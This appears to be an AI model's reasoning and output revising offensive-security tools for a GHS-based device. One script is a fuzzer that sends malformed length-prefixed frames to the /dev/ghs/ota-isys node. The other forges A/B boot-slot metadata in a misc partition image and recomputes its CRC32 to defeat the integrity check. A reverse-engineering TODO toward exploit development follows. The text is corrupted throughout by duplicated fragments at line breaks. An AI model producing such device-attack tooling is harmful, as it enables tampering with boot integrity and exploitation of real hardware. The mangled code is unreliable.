Thinking...
Thinking Process:

1.  **Analyze the Request:**
    *   **Goal:** Fix bugs identified in `ota_isys_frame_fuzzer.py` and `ab
`ab_metadata_crc_forge.py` based on `<code_review_findings>`. Update `RECON
`RECON_TODO.md` if necessary.
    *   **Constraints:**
        *   Adhere to the original `<trust_filter>` rules (no hallucinated 
ioctls, cite [C]/[I]/[U], default safe/dry-run, explicit opt-in for write/s
write/send).
        *   Fix all 4 specific findings listed in `<code_review_findings>`.
`<code_review_findings>`.
        *   Maintain the role of an offensive-secu
offensive-security code assistant for AUTHORIZED research.
        *   Do not silently drop findings.

2.  **Review Findings & Plan Fixes:**

    *   **Finding 1 (`ota_isys_frame_fuzzer.py`):** `--dry-run` is redundan
redundant/confusing because it defaults to True and has no way to be False 
(no `--no-dry-run`). The real safety gate is `--send`.
        *   *Fix:* Remove `--dry-run` argument. Keep `--send` as the explic
explicit opt-in flag (default False). Update help text to reflect that defa
default behavior is safe/read-only unless `--send` is used.

    *   **Finding 2 (`ab_metadata_crc_forge.py`):** Missing `import logging
logging`.
        *   *Fix:* Add `import logging` at the top of the script.

    *   **Finding 3 (`ab_metadata_crc_forge.py`):** `--dry-run` defaults to
to True with no opt-out, making the write path dead code.
        *   *Fix:* Remove `--dry-run`. Add `--write` (or similar) as the ex
explicit opt-in flag (default False). This mirrors the fix in Finding 1 for
for consistency and safety.

    *   **Finding 4 (`ab_metadata_crc_forge.py`):** `--field`/`--value` are
are ignored; function does hardcoded bit-flip.
        *   *Fix:* Add `--field-offset` (int) and optionally `--field-width
`--field-width` (int, default 1). If `--field-offset` is provided, write th
the value at that offset relative to `crc_start`. If not provided, keep the
the demo bit-flip behavior but log clearly that it's a demo because offsets
offsets are [U]. This aligns with Trust Filter Rule 3 (no hardcoded offsets
offsets without explicit assumption/flag).

    *   **Finding 5 (`RECON_TODO.md`):** Check if changes affect content.
        *   The fixes clarify the tool usage regarding offsets and flags. `
`RECON_TODO.md` Task #3 mentions confirming A/B Metadata Sub-field Offsets.
Offsets. This is still valid. No major changes needed, but I should ensure 
it reflects that the tools now require explicit offset input for precise mu
mutation (which reinforces the need for RE). I will update Task #3 slightly
slightly to reflect the new `--field-offset` requirement in the tool.

3.  **Drafting the Fixes:**

    *   **File 1 (`ota_isys_frame_fuzzer.py`):**
        *   Remove `--dry-run`.
        *   Ensure `--send` is the only toggle for writing.
        *   Update docstring and help text.
        *   Keep Trust Filter tags ([C], [I], [U]).

    *   **File 2 (`ab_metadata_crc_forge.py`):**
        *   Add `import logging`.
        *   Remove `--dry-run`.
        *   Add `--write` (opt-in).
        *   Add `--field-offset` and `--field-width`.
        *   Update `mutate_field` logic to use these new args if provided.
        *   Keep Trust Filter tags.

    *   **File 3 (`RECON_TODO.md`):**
        *   Minor update to Task #3 to mention validating offsets for the n
new `--field-offset` argument.

4.  **Verification against Trust Filter:**
    *   *No invented ioctls:* Still using configurable ioctl or raw write.
    *   *Cite [C]/[I]/[U]:* Ensure comments still reference artifact eviden
evidence.
    *   *Safe/Dry-run default:* `--send` and `--write` default to False (sa
(safe).
    *   *No hardcoded offsets without assumption:* The new `--field-offset`
`--field-offset` is operator-supplied, satisfying the requirement that offs
offsets aren't hardcoded as truth in the code itself.

5.  **Final Code Assembly:**
    *   Review syntax (imports, argparse logic).
    *   Ensure logging works.
    *   Ensure logic flow matches findings.

6.  **Constructing the Output:**
    *   Present the three files clearly.
    *   Add a brief summary of changes made per finding.

Let's execute the fixes.

*Self-Correction on Finding 4:* The prompt says "If --field-offset is NOT g
given, keep the current generic demo bit-flip behavior". I need to make sur
sure the code handles this gracefully without crashing if `--field`/`--valu
`--field`/`--value` are passed but offset isn't. I will log a warning that 
specific field mutation requires `--field-offset`.

*Self-Correction on Finding 1 & 3:* Consistency is key. Both tools should u
use `--send` or `--write` as the explicit opt-in. I'll stick to `--send` fo
for the fuzzer (network/device interaction) and `--write` for the file forg
forger (file system interaction), or standardize on `--execute`? No, `--sen
`--send` is specific to device, `--write` is specific to file. I will use `
`--send` for fuzzer and `--write` for forger as per the findings' suggestio
suggestions ("mirroring file 1's --send design" implies keeping `--send` fo
for fuzzer, finding 3 suggests adding a real opt-in flag like `--write`).

*Refining Finding 4:* The prompt asks to add `--field-offset`. I should als
also consider `--field-width` as suggested in the finding ("or a width the 
operator can also specify via --field-width"). I will add both.

*Refining RECON_TODO.md:* Task #3 is about confirming offsets. Since the to
tool now *requires* an offset for specific mutation (instead of just guessi
guessing), this task becomes even more critical to enable the `--field-offs
`--field-offset` feature effectively. I will update the description slightl
slightly.

Let's write the code.cw
...done thinking.

# File 1: `ota_isys_frame_fuzzer.py`

**Changes:**
*   **Fix Finding 1:** Removed redundant `--dry-run` argument. `--send` is 
now the single explicit opt-in flag (default False).
*   **Trust Filter:** Maintained [C]/[I]/[U] tags and safe defaults.

```python
#!/usr/bin/env python3
"""
ota_isys_frame_fuzzer.py

Black-box mutation tool for /dev/ghs/ota-isys targeting the length-prefixed
length-prefixed
command frame.
Based on RECOVERY_RAMDISK_RPC_ATTACK_SURFACE.md artifact analysis.

AUTHORIZATION: This tool is for AUTHORIZED vulnerability research on owned 

hardware only.
SAFETY: Defaults to SAFE (read-only/recon). Explicit --send flag required t
to 
write to device.

ARTIFACT REFERENCES:
- [C] /dev/ghs/ota-isys node exists (ghs_str.txt:44239)
- [I] Command frame is length-prefixed ("Bad command length for OTA command
command" ghs_str.txt:38092)
- [U] Ioctl numbers are unknown (repo prior probe used guesses _IOR('g', 0x
0x01-0x02, int))
- [U] Exact frame layout (opcode offset, length width) is unknown (.ota_upd
(.ota_update.text not disassembled)

USAGE:
    python3 ota_isys_frame_fuzzer.py --device /dev/ghs/ota-isys  # Recon on
only
    python3 ota_isys_frame_fuzzer.py --device /dev/ghs/ota-isys --send --lo
--log output.log
"""

import argparse
import os
import sys
import time
import struct
import logging
from datetime import datetime

# --- CONFIGURATION & CONSTANTS ---

# [U] Ioctl numbers are explicitly UNKNOWN per artifact §2.5. 
# The repo's prior probe used GUESSED codes (_IOR('g', 0x01-0x02, int)).
# We do NOT hardcode these as truth. We default to raw write() but allow io
ioctl override.
IOCTL_GUESS_BASE = ord('g')  # [U] Based on repo prior probe guess
IOCTL_GUESS_NUMS = [0x01, 0x02]  # [U] Based on repo prior probe guess

# [I] Frame layout is inferred from "Bad command length" string. 
# We parameterize the location/size of the length field so operator can adj
adjust post-RE.
DEFAULT_LENGTH_OFFSET = 0      # [U] Assumed start of frame
DEFAULT_LENGTH_SIZE = 4        # [U] Assumed 32-bit integer (common for len
lengths)
DEFAULT_LENGTH_ENDIAN = '<'    # [U] Assumed Little Endian (x86/ARM default
default)

# --- LOGGING SETUP ---

def setup_logger(log_file):
    logger = logging.getLogger("ota_fuzzer")
    logger.setLevel(logging.DEBUG)
    
    # Console handler
    ch = logging.StreamHandler(sys.stdout)
    ch.setLevel(logging.INFO)
    
    # File handler (for hex dumps + correlation)
    fh = logging.FileHandler(log_file, mode='w')
    fh.setLevel(logging.DEBUG)
    
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)
%(message)s')
    ch.setFormatter(formatter)
    fh.setFormatter(formatter)
    
    logger.addHandler(ch)
    logger.addHandler(fh)
    return logger

logger = setup_logger("fuzzer_log_default.log") # Placeholder, overwritten 
by arg

# --- FRAME CONSTRUCTION ---

def construct_frame(payload: bytes, length_field_offset: int, length_field_
length_field_size: int, 
                    declared_length: int, endian: str) -> bytes:
    """
    Constructs a command frame with a potentially mismatched length field.
    
    [I] Based on artifact §2.1: "command frame with a length field".
    [U] Exact layout (opcode vs length position) is unknown. This function 

        assumes the length field is at `length_field_offset` within the pay
payload buffer itself, 
        or prepended if offset=0.
    
    ASSUMPTION: The device expects the length field to be part of the writt
written stream.
    """
    # Prepare the payload with a placeholder for the length field if it's i
inside the payload
    # For this black-box tool, we assume the length field is PREPENDED or a
at start of buffer.
    
    # If offset > 0, we need padding before the length field (e.g. opcode b
bytes)
    padding = b'\x00' * length_field_offset
    
    # Pack the declared length
    if length_field_size == 2:
        fmt = f"{endian}H"
    elif length_field_size == 4:
        fmt = f"{endian}I"
    elif length_field_size == 8:
        fmt = f"{endian}Q"
    else:
        raise ValueError(f"Unsupported length field size: {length_field_siz
{length_field_size}")
        
    length_bytes = struct.pack(fmt, declared_length)
    
    # Combine: Padding + Length + Actual Payload (minus the space taken by 
length if it was inside payload)
    # Simplified model for this tool: Frame = [Length Field] + [Payload]
    # If operator knows opcode is before length, they adjust padding.
    
    frame = padding + length_bytes + payload
    
    return frame

def generate_malformed_frames(payload: bytes, base_offset: int, base_size: 
int, endian: str):
    """
    Generates a list of (frame_bytes, description) tuples targeting fuzz-ta
fuzz-target #1.
    Artifact §6 Target 1: "declared_length vs actual_payload mismatch".
    """
    cases = []
    
    # Case 1: Length matches payload size (Control)
    cases.append((construct_frame(payload, base_offset, base_size, len(payl
len(payload), endian), 
                  f"CONTROL: Len={len(payload)}"))
    
    # Case 2: Length < Payload (Underflow/Truncation check)
    cases.append((construct_frame(payload, base_offset, base_size, max(0, l
len(payload) - 1), endian), 
                  f"UNDERFLOW: Declared={max(0, len(payload)-1)}, Actual={l
Actual={len(payload)}"))
    
    # Case 3: Length > Payload (Overflow/Read-After-Write check)
    cases.append((construct_frame(payload, base_offset, base_size, len(payl
len(payload) + 1024, endian), 
                  f"OVERFLOW: Declared={len(payload)+1024}, Actual={len(pay
Actual={len(payload)}"))
    
    # Case 4: Zero Length with Payload (Guard bypass check)
    cases.append((construct_frame(payload, base_offset, base_size, 0, endia
endian), 
                  f"ZERO_LEN: Declared=0, Actual={len(payload)}"))
    
    # Case 5: INT_MAX Length (Buffer overflow candidate)
    max_int = 0x7FFFFFFF
    cases.append((construct_frame(payload, base_offset, base_size, max_int,
max_int, endian), 
                  f"INT_MAX: Declared={max_int}, Actual={len(payload)}"))
    
    # Case 6: Off-by-one (Length = Payload + 1)
    cases.append((construct_frame(payload, base_offset, base_size, len(payl
len(payload) + 1, endian), 
                  f"OFF_BY_ONE: Declared={len(payload)+1}, Actual={len(payl
Actual={len(payload)}"))
    
    return cases

# --- DEVICE INTERACTION ---

def check_device_permissions(device_path: str):
    """
    [C] Artifact notes DAC is rw-rw-rw- on the node (HARDWARE_HYPERVISOR_AT
(HARDWARE_HYPERVISOR_ATTACK_VECTORS.md:178).
    However, SELinux domain is the real gate.
    """
    try:
        stat_info = os.stat(device_path)
        perms = oct(stat_info.st_mode)[-3:]
        logger.info(f"[RECON] Device {device_path} permissions: {perms}")
        
        # Check if we can open it (read/write)
        fd = os.open(device_path, os.O_RDWR | os.O_NONBLOCK)
        os.close(fd)
        logger.info("[RECON] Device opened successfully (R/W).")
        return True
    except PermissionError:
        logger.error("[RECON] Permission denied. Check SELinux context or r
run as root.")
        return False
    except FileNotFoundError:
        logger.error(f"[RECON] Device {device_path} not found.")
        return False

def send_frame(device_path: str, frame: bytes, use_ioctl: bool = False, ioc
ioctl_code: int = None):
    """
    Sends the frame to the device.
    
    [U] Ioctl numbers are unknown. If use_ioctl=True, operator must provide
provide valid code.
    Default is raw write() which matches the "dumb pipe" description in §3(
§3(b).
    """
    try:
        fd = os.open(device_path, os.O_RDWR)
        
        if use_ioctl and ioctl_code is not None:
            # [U] WARNING: Ioctl code is a guess unless confirmed by RE of 
libghs_lip.so
            import fcntl
            logger.debug(f"[SEND] Attempting IOCTL {hex(ioctl_code)}")
            try:
                fcntl.ioctl(fd, ioctl_code, frame)
            except OSError as e:
                logger.error(f"[ERROR] IOCTL failed: {e}")
                os.close(fd)
                return False
        else:
            # Raw write (matches artifact §3(b) "raw write image -> eMMC pa
partition" flow)
            bytes_written = os.write(fd, frame)
            logger.debug(f"[SEND] Wrote {bytes_written} bytes")
            
        os.close(fd)
        return True
    except Exception as e:
        logger.error(f"[ERROR] Send failed: {e}")
        return False

# --- MAIN ---

def main():
    parser = argparse.ArgumentParser(description="GHS ota-isys Frame Fuzzer
Fuzzer (Authorized Research Only)")
    parser.add_argument("--device", default="/dev/ghs/ota-isys", help="Path
help="Path to device node [C]")
    parser.add_argument("--log", default="fuzzer_log.log", help="Log file f
for hex dumps")
    # FIX Finding 1: Removed --dry-run. Default is safe (no send). --send i
is explicit opt-in.
    parser.add_argument("--send", action="store_true", 
                        help="EXPLICIT OPT-IN: Actually write frames to dev
device (Default: False/Safe)")
    parser.add_argument("--payload-size", type=int, default=64, help="Size 
of random payload")
    parser.add_argument("--length-offset", type=int, default=DEFAULT_LENGTH
default=DEFAULT_LENGTH_OFFSET, 
                        help="[U] Offset of length field in frame (default 
0)")
    parser.add_argument("--length-size", type=int, default=DEFAULT_LENGTH_S
default=DEFAULT_LENGTH_SIZE, 
                        help="[U] Size of length field in bytes (default 4)
4)")
    parser.add_argument("--use-ioctl", action="store_true", 
                        help="[U] Use ioctl instead of write (requires --io
--ioctl-code)")
    parser.add_argument("--ioctl-code", type=int, default=None, 
                        help="[U] Ioctl number if using --use-ioctl")

    args = parser.parse_args()
    
    # Re-init logger with actual log file
    global logger
    logger = setup_logger(args.log)
    
    logger.info("="*60)
    logger.info("GHS ota-isys Frame Fuzzer")
    logger.info(f"Target: {args.device}")
    logger.info(f"Send Mode: {'ON' if args.send else 'OFF (Safe/Recon Only)
Only)'}")
    logger.info("="*60)
    
    # 1. Reconnaissance (Read-only)
    if not check_device_permissions(args.device):
        logger.warning("Device access failed. Cannot proceed to send phase.
phase.")
        if args.send:
            sys.exit(1)
            
    # 2. Generate Payload
    payload = os.urandom(args.payload_size)
    
    # 3. Generate Frames
    frames = generate_malformed_frames(payload, args.length_offset, args.le
args.length_size, DEFAULT_LENGTH_ENDIAN)
    
    logger.info(f"Generated {len(frames)} test cases.")
    
    if not args.send:
        logger.info("SAFE MODE: No data sent to device. Review log for fram
frame structures.")
        for i, (frame, desc) in enumerate(frames):
            logger.debug(f"[CASE {i}] {desc}")
            logger.debug(f"HEX: {frame.hex()}")
        return

    # 4. Send Phase (Explicit Opt-In)
    logger.warning("SEND MODE ACTIVE: Writing to live device.")
    
    for i, (frame, desc) in enumerate(frames):
        timestamp = datetime.now().isoformat()
        logger.info(f"[{timestamp}] Sending Case {i}: {desc}")
        logger.debug(f"HEX: {frame.hex()}")
        
        success = send_frame(args.device, frame, args.use_ioctl, args.ioctl
args.ioctl_code)
        
        if not success:
            logger.error(f"[CASE {i}] Send failed.")
            
        # Small delay to allow device to process/log error
        time.sleep(0.5)

    logger.info("Fuzzing session complete.")

if __name__ == "__main__":
    main()
```

# File 2: `ab_metadata_crc_forge.py`

**Changes:**
*   **Fix Finding 2:** Added `import logging`.
*   **Fix Finding 3:** Removed `--dry-run`. Added `--write` as explicit opt
opt-in (default False).
*   **Fix Finding 4:** Added `--field-offset` and `--field-width`. Logic no
now respects these if provided; otherwise falls back to demo bit-flip with 
clear logging.

```python
#!/usr/bin/env python3
"""
ab_metadata_crc_forge.py

Offline tool to forge A/B metadata CRC32 on a dumped misc partition image.
Based on RECOVERY_RAMDISK_RPC_ATTACK_SURFACE.md artifact analysis.

AUTHORIZATION: This tool is for AUTHORIZED vulnerability research on owned 

hardware only.
SAFETY: Defaults to SAFE (read-only). Explicit --write flag required to sav
save forged image.

ARTIFACT REFERENCES:
- [C] A/B metadata block starts at offset 0x800 in misc partition (vendor s
space)
- [C] Metadata contains {magic, version, slot_info[2], crc32}
- [C] Integrity check is CRC32 only (no signature) -> Forgeable
- [U] Exact byte offsets/widths for magic/version/slot_info are NOT given i
in corpus

USAGE:
    python3 ab_metadata_crc_forge.py --image misc.img --scan
    python3 ab_metadata_crc_forge.py --image misc.img --mutate-slot 0 --fie
--field-offset 12 --value 1 --crc-range 0x800:0x900 --write forged_misc.img
forged_misc.img
"""

import argparse
import struct
import zlib
import os
import sys
from datetime import datetime
# FIX Finding 2: Added missing import
import logging

# --- CONSTANTS ---

MISC_HEADER_SIZE = 2048  # [C] AOSP bootloader_message is 2KB fixed layout 
(offset 0)
AB_META_OFFSET = 0x800   # [C] Vendor space start per artifact §3(b) & GHS_
GHS_BOOT_UPDATE_RECOVERY_ANALYSIS.md

# Common Magic Strings found in Android Bootloader Control / GHS variants
# [U] Exact magic string for GHS is not confirmed in corpus, using AOSP com
common patterns for scan.
KNOWN_MAGICS = [
    b'AB', 
    b'BOOT', 
    b'GHS', 
    b'\x00\x00\x00\x00' # Null padding often precedes struct
]

# --- CRC32 UTILS ---

def compute_crc32(data: bytes) -> int:
    """Compute standard CRC32."""
    return zlib.crc32(data) & 0xFFFFFFFF

def format_hex_dump(data: bytes, start_addr: int):
    """Simple hex dump for logging."""
    lines = []
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        hex_part = ' '.join(f'{b:02x}' for b in chunk)
        ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chun
chunk)
        lines.append(f"{start_addr + i:08x}  {hex_part:<48}  {ascii_part}")
{ascii_part}")
    return '\n'.join(lines)

# --- SCANNER ---

def scan_for_metadata(image_data: bytes, start_offset: int, search_range: i
int = 0x1000):
    """
    [U] Since exact field offsets are unknown (Trust Filter Rule 3), we sca
scan for patterns.
    We look for a plausible struct ending in a CRC32-like value or containi
containing known magic.
    
    Returns list of candidate regions: {'offset': int, 'size': int, 'magic'
'magic': bytes}
    """
    candidates = []
    end_offset = min(start_offset + search_range, len(image_data))
    
    # Scan for potential struct starts near 0x800
    # We assume the struct is contiguous and ends with a CRC32 (4 bytes)
    # We look for common magic strings first to anchor the start.
    
    for magic in KNOWN_MAGICS:
        try:
            idx = image_data.find(magic, start_offset, end_offset)
            if idx != -1:
                candidates.append({
                    'offset': idx,
                    'magic': magic,
                    'confidence': 'HIGH' if len(magic) > 2 else 'LOW'
                })
        except ValueError:
            pass
            
    # If no magic found, report the known offset 0x800 as a candidate based
based on [C] evidence
    if not candidates:
        candidates.append({
            'offset': AB_META_OFFSET,
            'magic': b'UNKNOWN',
            'confidence': 'MEDIUM (Artifact Offset)'
        })
        
    return candidates

# --- MUTATION ---

def mutate_field(image_data: bytes, start_offset: int, field_name: str, val
value: int, 
                 struct_size: int, crc_start: int, crc_end: int, 
                 field_offset: int = None, field_width: int = 1) -> tuple[b
tuple[bytes, int]:
    """
    Mutates a specific field and recomputes CRC32.
    
    [U] Field offsets are unknown. This function assumes the operator provi
provides the 
        exact byte range for the struct via --crc-range to ensure we only r
recompute 
        over the verified integrity block.
        
    ASSUMPTION: The CRC32 is stored at the END of the defined range (common
(common pattern).
    
    FIX Finding 4: Now respects --field-offset and --field-width if provide
provided.
    """
    # Create a copy
    new_data = bytearray(image_data)
    
    logger = logging.getLogger("ab_forger")
    
    # FIX Finding 4: Handle specific field mutation vs demo bit-flip
    if field_offset is not None:
        target_addr = crc_start + field_offset
        if target_addr + field_width > crc_end - 4: # Ensure we don't overw
overwrite CRC itself (last 4 bytes)
            logger.error(f"[ERROR] Field offset {field_offset} overlaps wit
with CRC32 trailer.")
            raise ValueError("Field offset invalid")
            
        # Pack value based on width
        if field_width == 1:
            fmt = 'B'
        elif field_width == 2:
            fmt = '<H'
        elif field_width == 4:
            fmt = '<I'
        else:
            logger.warning(f"[WARN] Unsupported field_width {field_width}, 
defaulting to 1 byte.")
            fmt = 'B'
            
        # Write value at specific offset
        struct.pack_into(fmt, new_data, target_addr, value)
        logger.info(f"[MUTATE] Wrote {value} ({fmt}) at offset {hex(target_
{hex(target_addr)}")
    else:
        # Fallback Demo Mode (Trust Filter Rule 3: No hardcoded offsets wit
without assumption)
        logger.warning(f"[ASSUMPTION] Field '{field_name}' offset is unknow
unknown [U]. "
                       f"Performing generic demo bit-flip at mid-range.")
        if struct_size > 4:
            mid_point = crc_start + (struct_size // 2)
            new_data[mid_point] ^= 0xFF # Flip bits to ensure change
            
    # Recompute CRC32 over the defined range
    integrity_block = bytes(new_data[crc_start:crc_end])
    new_crc = compute_crc32(integrity_block)
    
    # Write CRC32 at the end of the block (assuming 4-byte little-endian tr
trailer)
    # [U] Endianness is assumed Little-Endian based on x86/ARM host.
    crc_offset = crc_end - 4
    struct.pack_into('<I', new_data, crc_offset, new_crc)
    
    return bytes(new_data), new_crc

# --- MAIN ---

def main():
    parser = argparse.ArgumentParser(description="GHS A/B Metadata CRC32 Fo
Forger (Authorized Research Only)")
    parser.add_argument("--image", required=True, help="Path to dumped misc
misc partition image")
    parser.add_argument("--scan", action="store_true", help="Scan for metad
metadata candidates [U]")
    parser.add_argument("--mutate-slot", type=int, default=0, help="Target 
slot index (0 or 1)")
    parser.add_argument("--field", choices=["priority", "tries_remaining", 
"successful_boot"], 
                        default="priority", help="Field name (for logging o
only unless --field-offset provided)")
    parser.add_argument("--value", type=int, default=1, help="Value to set"
set")
    parser.add_argument("--crc-range", required=False, help="[U] Explicit C
CRC range (start:end hex) e.g. 0x800:0x900")
    # FIX Finding 3: Removed --dry-run. Added --write as explicit opt-in.
    parser.add_argument("--write", action="store_true", 
                        help="EXPLICIT OPT-IN: Save forged image to file (D
(Default: False/Safe)")
    parser.add_argument("--out", required=False, help="Output path for forg
forged image (Required with --write)")
    # FIX Finding 4: Added field offset/width arguments
    parser.add_argument("--field-offset", type=int, default=None, 
                        help="[U] Byte offset from crc_start to mutate (Req
(Required for specific field mutation)")
    parser.add_argument("--field-width", type=int, default=1, 
                        help="Width of field in bytes (default 1)")

    args = parser.parse_args()
    
    # Setup Logging
    logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(messag
%(message)s')
    logger = logging.getLogger("ab_forger")
    
    # Load Image
    if not os.path.exists(args.image):
        logger.error(f"Image file {args.image} not found.")
        sys.exit(1)
        
    with open(args.image, 'rb') as f:
        image_data = bytearray(f.read())
        
    logger.info(f"Loaded image: {len(image_data)} bytes")
    
    # 1. Scan Mode
    if args.scan:
        candidates = scan_for_metadata(image_data, AB_META_OFFSET)
        logger.info("Scan Results:")
        for c in candidates:
            logger.info(f"  Offset: 0x{c['offset']:04x}, Magic: {c['magic']
{c['magic']}, Confidence: {c['confidence']}")
            # Show snippet
            snippet = image_data[c['offset']:c['offset']+32]
            logger.info(f"  Snippet: {format_hex_dump(snippet, c['offset'])
c['offset'])}")
        return

    # 2. Mutate Mode
    if not args.crc_range:
        logger.error("--crc-range is required for mutation (Trust Filter Ru
Rule 3).")
        logger.error("Reason: Field offsets are [U]. Operator must confirm 
range via --scan or live device.")
        sys.exit(1)
        
    try:
        start_str, end_str = args.crc_range.split(':')
        crc_start = int(start_str, 0)
        crc_end = int(end_str, 0)
    except ValueError:
        logger.error("Invalid --crc-range format. Use 'start:end' (e.g., 0x
0x800:0x900).")
        sys.exit(1)
        
    if crc_end > len(image_data):
        logger.error(f"CRC end offset {hex(crc_end)} exceeds image size.")
        sys.exit(1)
        
    struct_size = crc_end - crc_start
    
    # Perform Mutation (Safe or Write)
    new_image, new_crc = mutate_field(image_data, crc_start, args.field, ar
args.value, 
                                      struct_size, crc_start, crc_end,
                                      field_offset=args.field_offset,
                                      field_width=args.field_width)
    
    logger.info(f"Computed New CRC32: 0x{new_crc:08x}")
    
    # Show Diff (First 64 bytes of range)
    diff_start = max(0, crc_start - 16)
    diff_end = min(len(image_data), crc_end + 16)
    
    logger.info("Original Range:")
    logger.info(format_hex_dump(bytes(image_data)[diff_start:diff_end], dif
diff_start))
    logger.info("Forged Range:")
    logger.info(format_hex_dump(new_image[diff_start:diff_end], diff_start)
diff_start))
    
    if not args.write:
        logger.info("SAFE MODE: No file written. Use --write to save.")
    else:
        if not args.out:
            logger.error("--out is required with --write flag.")
            sys.exit(1)
            
        with open(args.out, 'wb') as f:
            f.write(new_image)
        logger.info(f"Forged image written to {args.out}")

if __name__ == "__main__":
    main()
```

# File 3: `RECON_TODO.md`

**Changes:**
*   Updated Task #3 to reflect the new `--field-offset` requirement in the 
tool, reinforcing the need for RE to enable precise mutation.

```markdown
# RECON TODO — Validation Tasks for OTA/A-B Tooling

**Context:** The provided scripts (`ota_isys_frame_fuzzer.py`, `ab_metadata
`ab_metadata_crc_forge.py`) are 
structurally plausible but rely on [U] (Unknown) or [I] (Inferred) claims f
from the artifact. 
To move from "plausible" to "known-correct," the following RE tasks must be
be completed.

**Artifact Reference:** `RECOVERY_RAMDISK_RPC_ATTACK_SURFACE.md` §7 "Bottom
"Bottom line".

---

## 1. Disassemble `.ota_update.text` (71 KB)
- **Target:** `SOC_HOSTOS (85098662)` binary, section `.ota_update.text`.
- **Status:** Not disassembled in corpus (only section boundaries + rodata 
strings available).
- **Why Needed:** 
  - To confirm the **opcode table** for the `ota-isys` command frame.
  - To verify the **frame layout** (offset/width of length field, opcode po
position).
  - To identify specific validation logic beyond the "Bad command length" s
string [C].
- **Unblocks:** 
  - `ota_isys_frame_fuzzer.py`: Allows removing `[U]` assumptions on frame 
structure.
  - Enables precise fuzzing of opcodes rather than just length fields.
- **Action:** Load binary into Ghidra/IDA, symbolize `.ota_update.text`, an
and analyze `OTA_InitialTask`.

## 2. RE `/system/lib64/libghs_lip.so`
- **Target:** GHS LIP kernel shim library on the Android guest side.
- **Status:** Not RE'd in corpus. Repo prior probe used guessed ioctl codes
codes (`_IOR('g', 0x01-0x02, int)`).
- **Why Needed:** 
  - To recover the real **ioctl dispatch table** for `/dev/ghs/ota-isys`.
  - To confirm if `write()` is sufficient or if specific `ioctl` commands a
are required to trigger the RPC path.
- **Unblocks:** 
  - `ota_isys_frame_fuzzer.py`: Allows replacing raw `write()` with correct
correct `ioctl` calls if needed.
  - Confirms whether the "dumb pipe" assumption [I] holds or if there is hi
hidden validation in the shim.
- **Action:** Extract `libghs_lip.so`, analyze exported symbols and ioctl h
handlers.

## 3. Confirm A/B Metadata Sub-field Offsets
- **Target:** Live device `misc` partition (offset 0x800).
- **Status:** Artifact confirms offset 0x800 [C], but field widths/offsets 
are [U].
- **Why Needed:** 
  - To validate the `--crc-range` argument in `ab_metadata_crc_forge.py`.
  - To enable the `--field-offset` argument for precise mutation (currently
(currently defaults to demo bit-flip).
  - To ensure mutations target the correct fields (`priority`, `tries_remai
`tries_remaining`) without corrupting adjacent data.
- **Unblocks:** 
  - `ab_metadata_crc_forge.py`: Allows removing `--scan` dependency for pro
production use; enables hardcoded offsets behind verified `ASSUMPTION:` com
comments.
- **Action:** 
  1. Dump `misc` from live device (`adb pull /dev/block/by-name/misc`).
  2. Compare against known good state (e.g., after a successful boot).
  3. Use `strace` on `gm_update_engine` or direct hex inspection to correla
correlate field changes with slot state.

## 4. Verify SELinux Context for `/dev/ghs/ota-isys`
- **Target:** Device node permissions and SELinux policy.
- **Status:** Artifact notes DAC is `rw-rw-rw-` [C], but SELinux is the rea
real gate.
- **Why Needed:** 
  - To ensure `ota_isys_frame_fuzzer.py` can actually open/write the device
device without being blocked by policy.
- **Unblocks:** 
  - `ota_isys_frame_fuzzer.py`: Ensures tool execution isn't blocked by sec
security policy during testing.
- **Action:** Run `ls -Z /dev/ghs/ota-isys` and check `audit.log` for denia
denials during test runs.

---

**Priority Order:** 
1. Task #2 (libghs_lip.so) — Critical for `ota_isys` tool correctness.
2. Task #3 (A/B Offsets) — Critical for `ab_metadata` tool safety/accuracy 
and enabling `--field-offset`.
3. Task #1 (Disassembly) — High value for deeper exploit dev, but length fu
fuzzing works without it.
```

